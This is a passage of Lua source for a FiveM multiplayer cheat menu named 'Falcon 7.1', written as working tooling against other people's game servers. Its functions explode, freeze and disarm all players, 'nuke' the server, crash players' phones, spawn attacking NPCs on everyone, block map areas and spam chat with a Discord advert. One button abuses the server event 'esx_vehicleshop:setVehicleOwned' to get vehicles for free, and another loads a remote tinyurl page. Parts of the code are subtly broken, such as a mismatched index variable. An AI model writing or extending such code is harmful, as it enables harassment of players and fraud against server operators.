                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                
                elseif selPFuncIndex == 7 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                
                elseif selPFuncIndex == 8 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                end
            elseif Falcon.Button("~g~Add ~s~Special Finish") then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
            elseif Falcon.Button("~r~Remove ~s~Special Finish") then
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
            elseif Falcon.Button("~g~Add ~s~Suppressor") then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
            elseif Falcon.Button("~r~Remove ~s~Suppressor") then
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
            elseif Falcon.Button("~g~Add ~s~Scope") then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
            elseif Falcon.Button("~r~Remove ~s~Scope") then
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
            end


        elseif Falcon.IsMenuOpened('weaponspawner') then
            if Falcon.MenuButton('~r~→  ~s~Melee Weapons', 'melee') then
            elseif Falcon.MenuButton('~r~→  ~s~Pistols', 'pistol') then
            elseif Falcon.MenuButton('~r~→  ~s~SMGs / MGs', 'smg') then
            elseif Falcon.MenuButton('~r~→  ~s~Shotguns', 'shotgun') then
            elseif Falcon.MenuButton('~r~→  ~s~Assault Rifles', 'assault') then
            elseif Falcon.MenuButton('~r~→  ~s~Sniper Rifles', 'sniper') then
            elseif Falcon.MenuButton('~r~→  ~s~Thrown Weapons', 'thrown') then
            elseif Falcon.MenuButton('~r~→  ~s~Heavy Weapons', 'heavy') then
			end
        

        elseif Falcon.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if Falcon.Button("~r~» ~s~"..meleeweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
                end
            end

        elseif Falcon.IsMenuOpened('pistol') then
			for i = 1, #pistolweapons do
                if Falcon.Button("~r~» ~s~"..pistolweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
				elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if Falcon.Button("~r~» ~s~"..smgweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, smgweapons[i][1])
				elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if Falcon.Button("~r~» ~s~"..shotgunweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, shotgunweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if Falcon.Button("~r~» ~s~"..assaultweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, assaultweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if Falcon.Button("~r~» ~s~"..sniperweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, sniperweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if Falcon.Button("~r~» ~s~"..thrownweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, thrownweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
                end
            end

        elseif Falcon.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if Falcon.Button("~r~» ~s~"..heavyweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, heavyweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
                end
            end

elseif Falcon.IsMenuOpened('fuck') then
    if Falcon.CheckBox("Include Self", includeself, "No", "Yes") then
        includeself = not includeself
    elseif Falcon.ComboBox("~r~→  ~s~Prob Everyone", {"Ufo ~y~Everyone", "Windmill ~g~Everyone", "Wall ~p~Everyone", "Weed ~c~Everyone"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
            currPFuncIndex = currentIndex
            selPFuncIndex = currentIndex
            end) then
            if selPFuncIndex == 1 then
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'p_spinning_anus_s'
                        local ec = -145066854
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'p_spinning_anus_s'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
            elseif selPFuncIndex == 2 then
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'prop_windmill_01'
                        local ec = -145066854
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'prop_windmill_01'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
            elseif selPFuncIndex == 3 then
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'xs_prop_hamburgher_wl'
                        local ec = -145066854
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'xs_prop_hamburgher_wl'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
            elseif selVFuncIndexx == 4 then
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'prop_weed_01'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'prop_weed_01'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
            end
        elseif Falcon.ComboBox("~r~→  ~s~Block Map", {"~b~Block ~s~Simeons","~b~Block ~s~PD", "~b~Block ~s~The Whole Square"}, currPFuncIndexx, selPFuncIndexx, function(currentIndexx, selectedIndexx)
            currPFuncIndexx = currentIndexx
            selPFuncIndexx = currentIndexx
            end) then
                if selPFuncIndexx == 1 then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer))) roundx = tonumber(string.format('%.2f', x)) roundy = tonumber(string.format('%.2f', y)) roundz = tonumber(string.format('%.2f', z)) local e8 = -145066854 RequestModel(e8) while not HasModelLoaded(e8) do Citizen.Wait(0) end local cd1 = CreateObject(e8, -50.97, -1066.92, 26.52, true, true, false) local cd2 = CreateObject(e8, -63.86, -1099.05, 25.26, true, true, false) local cd3 = CreateObject(e8, -44.13, -1129.49, 25.07, true, true, false) SetEntityHeading(cd1, 160.59) SetEntityHeading(cd2, 216.98) SetEntityHeading(cd3, 291.74) FreezeEntityPosition(cd1, true) FreezeEntityPosition(cd2, true) FreezeEntityPosition(cd3, true)
                elseif selPFuncIndexx == 2 then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer))) roundx = tonumber(string.format('%.2f', x)) roundy = tonumber(string.format('%.2f', y)) roundz = tonumber(string.format('%.2f', z)) local e8 = -145066854 RequestModel(e8) while not HasModelLoaded(e8) do Citizen.Wait(0) end local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false) local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false) local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false) local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false) SetEntityHeading(pd1, 130.75) SetEntityHeading(pd2, 212.63) SetEntityHeading(pd3, 340.06) SetEntityHeading(pd4, 209.57)FreezeEntityPosition(pd1, true) FreezeEntityPosition(pd2, true) FreezeEntityPosition(pd3, true) FreezeEntityPosition(pd4, true)
                elseif selPFuncIndexx == 3 then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer))) roundx = tonumber(string.format('%.2f', x)) roundy = tonumber(string.format('%.2f', y)) roundz = tonumber(string.format('%.2f', z)) local e8 = -145066854 RequestModel(e8) while not HasModelLoaded(e8) do Citizen.Wait(0) end local e9 = CreateObject(e8, 97.8, -993.22, 28.41, true, true, false) local ea = CreateObject(e8, 247.08, -1027.62, 28.26, true, true, false) local e92 = CreateObject(e8, 274.51, -833.73, 28.25, true, true, false) local ea2 = CreateObject(e8, 291.54, -939.83, 27.41, true, true, false) local ea3 = CreateObject(e8, 143.88, -830.49, 30.17, true, true, false) local ea4 = CreateObject(e8, 161.97, -768.79, 29.08, true, true, false) local ea5 = CreateObject(e8, 151.56, -1061.72, 28.21, true, true, false) SetEntityHeading(e9, 39.79) SetEntityHeading(ea, 128.62) SetEntityHeading(e92, 212.1) SetEntityHeading(ea2, 179.22) SetEntityHeading(ea3, 292.37) SetEntityHeading(ea4, 238.46) SetEntityHeading(ea5, 61.43) FreezeEntityPosition(e9, true) FreezeEntityPosition(ea, true) FreezeEntityPosition(e92, true) FreezeEntityPosition(ea2, true) FreezeEntityPosition(ea3, true) FreezeEntityPosition(ea4, true) FreezeEntityPosition(ea5, true)
                end
    elseif Falcon.Button("Explode All ~b~Players") then
        ExplodeAll(includeself)
    elseif Falcon.CheckBox("Explode All ~b~Players ~r~(LOOP)", ExplodingAll) then
        ExplodingAll = not ExplodingAll
    elseif Falcon.CheckBox("Freeze All", freezeall) then
        freezeall = not freezeall
    elseif Falcon.Button("Give All ~b~Players ~r~Weapons") then
        GiveAllPlayersWeapons(includeself)
    elseif Falcon.Button("Strip All ~b~Players ~r~Weapons") then
        StripAll(includeself)
    elseif Falcon.Button("~h~~y~ ~r~Nuke ~w~Server") then
        ShowInfo("~y~Fucking Players...")
        nukeserver()
    elseif Falcon.CheckBox("~y~World on fire", WorldOnFire, Enable_Nuke) then
        WorldOnFire = not WorldOnFire
        Enable_Nuke = not Enable_Nuke
        if WorldOnFire then
        ShowInfo("~r~🔥Destroyer🔥...")
            wofDUI = CreateDui("https://tinyurl.com/uzsqjsp", 1, 1)
        else
            DestroyDui(wofDUI)
        end
    elseif Falcon.Button('Spam Chat', '~g~Not Looping') then
        for colorLoop=0,9 do
            TriggerCustomEvent(true, '_chat:messageEntered','JoeMoeDinHoeMoe#1325',{MainColor.r,MainColor.g,MainColor.b},'^'..colorLoop..' Falcon 7.1 | https://discord.gg/raag3v7')
        end
    elseif Falcon.CheckBox("GcPhone ~r~Crasher", Enable_GcPhone) then Enable_GcPhone = not Enable_GcPhone
    elseif Falcon.Button("Spawn ~p~Lion ~r~all Players") then
        local mtlion = "A_C_MtLion"
        for i = 0, 128 do
            local co = GetEntityCoords(GetPlayerPed(i))
            RequestModel(GetHashKey(mtlion))
            Citizen.Wait(50)
            if HasModelLoaded(GetHashKey(mtlion)) then
                local ped =
                    CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                NetworkRegisterEntityAsNetworked(ped)
                if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    Citizen.Wait(50)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                elseif IsEntityDead(GetPlayerPed(i)) then
                    TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                else
                    Citizen.Wait(0)
                end
            end
        end
    elseif Falcon.Button("Spawn ~p~SWAT ~r~all Players ") then
        local swat = "s_m_y_swat_01"
        local bR = "WEAPON_ASSAULTRIFLE"
        for i = 0, 128 do
            local coo = GetEntityCoords(GetPlayerPed(i))
            RequestModel(GetHashKey(swat))
            Citizen.Wait(50)
            if HasModelLoaded(GetHashKey(swat)) then
                local ped =
                    CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
                    CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
                    CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                    CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                NetworkRegisterEntityAsNetworked(ped)
                if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                    local ei = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(ei, false)
                    SetNetworkIdCanMigrate(ei, true)
                    SetNetworkIdExistsOnAllMachines(ei, true)
                    GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                    SetPedCanSwitchWeapon(ped, true)
                    NetToPed(ei)
                    TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                elseif IsEntityDead(GetPlayerPed(i)) then
                    TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                else
                    Citizen.Wait(0)
                end
            end
        end
    end  
        

        elseif Falcon.IsMenuOpened('vehicle') then
            if Falcon.MenuButton("🚑 Vehicle Spawner", 'vehiclespawner') then
            elseif Falcon.MenuButton("~r~→  ~s~Vehicle Mods", 'vehiclemods') then
            elseif Falcon.MenuButton("~r~→  ~s~Vehicle Engine ~r~Boost", "VehBoostMenu") then
            elseif Falcon.MenuButton("~r~→  ~s~Vehicle Torque ~r~Boost", "VehTorque") then
            elseif Falcon.ComboBoxSlider("Speed Multiplier", SpeedModWords, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                currSpeedIndex = currentIndex
                selSpeedIndex = currentIndex
                SpeedModAmt = SpeedModOps[currSpeedIndex]
                
                if SpeedModAmt == 1.0 then
                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
                else
                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
                end
            end) then
            elseif Falcon.Button("~b~Remote ~s~Car") then
                    RCCAR123 = GetKeyboardInput("Enter Car Name", "", 1000000)
                    FiveM.Subtitle("~b~Spawned Your RC car")    
                    if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
                            RCCar.Start() 
                        else
                            FiveM.Subtitle("Model Isn't Valid!")
                        end
                    elseif Falcon.CheckBox("Seatbelt (No Fall)", Falcon.Toggle.VehicleNoFall) then
                        Falcon.Toggle.VehicleNoFall = not Falcon.Toggle.VehicleNoFall
                    elseif Falcon.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                            if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
                                SavedVehicle = not SavedVehicle
                                RemoveBlip(pvblip)
                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                                pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                                pvblip = AddBlipForEntity(pvehicle)
                                SetBlipSprite(pvblip, 225) 
                                SetBlipColour(pvblip, 84)
                                ShowInfo("~g~Current Vehicle Saved")
                                pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                            elseif SavedVehicle then
                                SavedVehicle = not SavedVehicle
                                pvehicle = nil
                                RemoveBlip(pvblip)
                                ShowInfo("~b~Saved Vehicle Blip Removed")
                            else
                                ShowInfo("~r~You are not in a vehicle!")
                            end
            elseif Falcon.CheckBox("Vehicle ~g~Godmode", VehGod) then
                VehGod = not VehGod
            elseif Falcon.ComboBox("Vehicle Functions ~r~»", {"🔧 Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
                currVFuncIndex = currentIndex
                selVFuncIndex = currentIndex
                end) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                RequestControlOnce(veh)
                if selVFuncIndex == 1 then
                    FixVeh(veh)
                    SetVehicleEngineOn(veh, 1, 1)
                    ShowInfo("\126\114\126\240\159\148\165\111\70\108\97\113\109\101\32\105\115\32\119\111\114\107\105\110\103\32\104\97\114\100\32\102\105\120\105\110\103\32\121\111\117\114\32\99\97\114\240\159\148\165\46\46\46\10")
                elseif selVFuncIndex == 2 then
                    SetVehicleDirtLevel(veh, 0)
                elseif selVFuncIndex == 3 then
                    SetVehicleDirtLevel(veh, 15.0)
                end
            elseif Falcon.Button('Flip Vehicle', '~g~:)))') then
                SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
            elseif Falcon.CheckBox("Horn ~g~Boost", HornBoost) then
                HornBoost = not HornBoost
            elseif Falcon.Button("~g~AI ~r~Drive ~s~to waypoint") then
                if DoesBlipExist(GetFirstBlipInfoId(8)) then
                    local blipIterator = GetBlipInfoIdIterator(8)
                    local blip = GetFirstBlipInfoId(8, blipIterator)
                    local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                    SetDriveTaskDrivingStyle(ped, 2883621)
                    speedmit = true
                end
            elseif Falcon.Button("~g~AI ~r~Stop ~s~Drive AUTO") then
                speedmit = false
                if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                    ClearPedTasks(GetPlayerPed(-1))
                else
                    ClearPedTasksImmediately(GetPlayerPed(-1))
                end
        
            elseif Falcon.Button("Buy vehicle for free ~r~(risk)") then
            local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
            local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
            if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
            RequestModel(cb)
            while not HasModelLoaded(cb) do
            Citizen.Wait(0)
            end
            local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
                )
                SetVehicleNumberPlateText(veh, cw)
                local cx = ESX.Game.GetVehicleProperties(veh)
                TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
                ShowInfo('~g~~h~Success', false)
            else
                ShowInfo('~b~~h~Model is not valid!', true)
end
            elseif Falcon.CheckBox("Drift", driftMode) then
                driftMode = not driftMode
            elseif Falcon.CheckBox("Collision", Collision) then
                Collision = not Collision
                elseif Falcon.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                EasyHandling = not EasyHandling
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                if not EasyHandling then
                    SetVehicleGravityAmount(veh, 9.8)
                else
                    SetVehicleGravityAmount(veh, 30.0)
                end
                elseif Falcon.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
                    DeadlyBulldozer = not DeadlyBulldozer
                    if DeadlyBulldozer then
                        local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
                        SetVehicleCanBreak(veh, not DeadlyBulldozer)
                        SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
                        SetVehicleEnginePowerMultiplier(veh, 2500.0)
                        SetVehicleEngineTorqueMultiplier(veh, 2500.0)
                        SetVehicleEngineOn(veh, 1, 1, 1)
                        SetVehicleGravityAmount(veh, 50.0)
                        SetVehicleColours(veh, 27, 27)
                        ShowInfo("~r~Go forth and devour thy enemies!\nPress ~w~E ~r~to launch a minion!")
                    elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                        DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                    end
                end
        

        elseif Falcon.IsMenuOpened('vehiclespawner') then
            if Falcon.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                FiveM.Subtitle("~s~Spawned Your ~b~" .. model .. " ~s~have fun")
            elseif Falcon.CheckBox("~r~→  ~s~Spawn Upgraded", vehiclesSpawnUpgraded, "No", "Yes") then
                vehiclesSpawnUpgraded = not vehiclesSpawnUpgraded
            elseif Falcon.CheckBox("~r~→  ~s~Spawn with God-Mode", spawnvehgod, "No", "Yes") then
                spawnvehgod = not spawnvehgod
            elseif Falcon.CheckBox("~r~→  ~s~Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf
            elseif Falcon.CheckBox("~r~→  ~s~Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif Falcon.CheckBox("~r~→  ~s~Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif Falcon.MenuButton('Compacts', 'compacts') then
            elseif Falcon.MenuButton('Sedans', 'sedans') then
            elseif Falcon.MenuButton('SUVs', 'suvs') then
            elseif Falcon.MenuButton('Coupes', 'coupes') then
